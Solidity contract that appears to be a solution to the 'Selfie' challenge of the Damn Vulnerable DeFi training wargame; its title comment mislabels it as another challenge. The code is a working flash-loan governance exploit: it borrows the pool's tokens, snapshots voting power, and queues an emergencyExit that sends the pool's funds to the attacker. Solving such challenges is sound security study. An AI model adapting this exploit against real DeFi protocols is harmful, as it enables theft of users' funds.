// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";

import "./ISimpleGovernance.sol";

interface ISelfiePool {
    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns (bool);

    function emergencyExit(address receiver) external;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Attacker_selfie is IERC3156FlashBorrower {
    ISelfiePool immutable pool;
    DamnValuableTokenSnapshot immutable token;
    ISimpleGovernance immutable governance;
    address immutable me;

    constructor(
        address _pool,
        address _token,
        address _governance
    ) {
        pool = ISelfiePool(_pool);
        token = DamnValuableTokenSnapshot(_token);
        governance = ISimpleGovernance(_governance);
        me = msg.sender;
    }

    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        token.snapshot();
        governance.queueAction(address(pool), 0, data);
        token.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            me
        );
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            amount,
            data
        );
    }
}
